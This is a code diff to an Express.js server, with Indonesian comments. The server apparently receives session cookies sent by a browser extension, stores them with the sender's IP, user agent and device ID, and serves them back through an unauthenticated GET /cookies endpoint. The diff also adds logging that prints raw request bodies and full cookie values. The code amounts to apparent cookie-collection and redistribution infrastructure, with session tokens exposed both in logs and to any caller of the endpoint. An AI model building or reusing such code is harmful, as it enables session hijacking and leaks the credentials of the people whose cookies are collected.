@@ -92,10 +92,16 @@ let lastCookieValue = "";
 
 // Endpoint menerima cookie dari extension
 app.post("/cookies", (req, res) => {
+  console.log("=== DEBUG /cookies request ===");
+  console.log("Headers:", req.headers);
+  console.log("Raw body:", req.body);
+
   const { cookie } = req.body;
   const deviceId = req.headers["x-device-id"] || req.body.deviceId || "";
   let keyName = "",
     keyDevice = "";
+
+  // Cari API key berdasarkan deviceId
   if (deviceId) {
     const keyObj = apiKeys.find((k) => {
       if (Array.isArray(k.deviceIds)) {
@@ -106,28 +112,62 @@ app.post("/cookies", (req, res) => {
     if (keyObj) {
       keyName = keyObj.name || "";
       keyDevice = deviceId;
+      console.log("POST /cookies - API key found:", keyName);
+    } else {
+      console.log("POST /cookies - No API key found for deviceId:", deviceId);
     }
   }
-  if (
-    typeof cookie === "string" &&
-    decodeURIComponent(cookie).endsWith("%3D%3D")
-  ) {
-    if (cookie !== lastCookieValue) {
-      lastCookieValue = cookie;
-      lastCookies.unshift({
-        value: cookie,
-        time: new Date().toISOString(),
-        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
-        ua: req.headers["user-agent"] || "",
-        deviceId: keyDevice,
-        keyName: keyName,
-      });
-      if (lastCookies.length > 1000) lastCookies.pop();
-    }
-    res.json({ success: true, cookie });
-  } else {
-    res.status(400).json({ error: "Cookie tidak valid" });
+
+  // Validasi cookie
+  if (typeof cookie !== "string" || !cookie) {
+    console.warn("POST /cookies - Invalid cookie: Not a string or empty");
+    return res.status(400).json({ error: "Cookie must be a non-empty string" });
   }
+
+  let decodedCookie;
+  try {
+    decodedCookie = decodeURIComponent(cookie);
+    console.log("POST /cookies - Decoded cookie:", decodedCookie);
+  } catch (e) {
+    console.warn("POST /cookies - Failed to decode cookie:", e.message);
+    return res.status(400).json({ error: "Failed to decode cookie" });
+  }
+
+  // Periksa apakah cookie valid (base64 dengan == atau %3D%3D)
+  const isValidCookie = cookie.endsWith("%3D%3D") || decodedCookie.endsWith("==");
+  if (!isValidCookie) {
+    console.warn("POST /cookies - Cookie validation failed:", { encoded: cookie, decoded: decodedCookie });
+    return res.status(400).json({ error: "Cookie does not end with valid base64 padding" });
+  }
+
+  // Simpan cookie jika berbeda dari yang terakhir
+  if (cookie !== lastCookieValue) {
+    lastCookieValue = cookie;
+    lastCookies.unshift({
+      value: cookie,
+      time: new Date().toISOString(),
+      ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
+      ua: req.headers["user-agent"] || "",
+      deviceId: keyDevice,
+      keyName: keyName,
+    });
+    if (lastCookies.length > 1000) lastCookies.pop();
+    console.log("POST /cookies - Cookie saved:", cookie);
+  }
+
+  res.json({ success: true, cookie });
+});
+
+app.get("/cookies", (req, res) => {
+  console.log("GET /cookies - Fetching cookies");
+  if (!lastCookies || !Array.isArray(lastCookies)) {
+    console.warn("GET /cookies - No cookies available");
+    return res.status(200).json({ cookie: null, list: [] });
+  }
+  res.json({
+    cookie: lastCookieValue || null,
+    list: lastCookies.slice(0, 50),
+  });
 });
 
 // Endpoint untuk membaca cookies terakhir (untuk panel chat)
